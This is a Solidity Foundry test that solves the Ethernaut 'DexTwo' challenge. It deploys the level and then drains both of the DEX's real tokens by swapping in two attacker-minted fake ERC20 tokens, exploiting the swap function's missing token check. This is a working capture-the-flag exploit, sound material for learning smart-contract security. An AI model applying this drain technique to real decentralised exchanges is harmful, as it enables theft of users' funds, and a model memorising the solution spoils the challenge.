// SPDX-License-Identifier: MIT

pragma solidity ^0.8.10;

import "ds-test/test.sol";
import "../DexTwo/DexTwo.sol";
import "../DexTwo/DexTwoFactory.sol";
import "openzeppelin-contracts/contracts/token/ERC20/presets/ERC20PresetFixedSupply.sol";
import "../Ethernaut.sol";
import "./utils/vm.sol";

contract DexTwoTest is DSTest {
    Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
    Ethernaut ethernaut;

    function setUp() public {
        // Setup instance of the Ethernaut contracts
        ethernaut = new Ethernaut();
    }

    function testDexTwoAttack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////

        DexTwoFactory dexTwoFactory = new DexTwoFactory();
        ethernaut.registerLevel(dexTwoFactory);
        vm.startPrank(tx.origin);
        address _dexTwo = ethernaut.createLevelInstance(dexTwoFactory);
        DexTwo dexTwo = DexTwo(_dexTwo);

        //////////////////
        // LEVEL ATTACK //
        //////////////////

        uint256 tokenAmount = 100;

        ERC20PresetFixedSupply tokenInstanceThree = new ERC20PresetFixedSupply("Token 3", "TKN3", tokenAmount * 2, msg.sender);
        tokenInstanceThree.transfer(_dexTwo, tokenAmount);
        tokenInstanceThree.approve(_dexTwo, tokenAmount);
        dexTwo.swap(address(tokenInstanceThree), dexTwo.token1(), tokenAmount);

        ERC20PresetFixedSupply tokenInstanceFour = new ERC20PresetFixedSupply("Token 4", "TKN4", tokenAmount * 2, msg.sender);
        tokenInstanceFour.transfer(_dexTwo, tokenAmount);
        tokenInstanceFour.approve(_dexTwo, tokenAmount);
        dexTwo.swap(address(tokenInstanceFour), dexTwo.token2(), tokenAmount);


        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////

        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(_dexTwo));
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}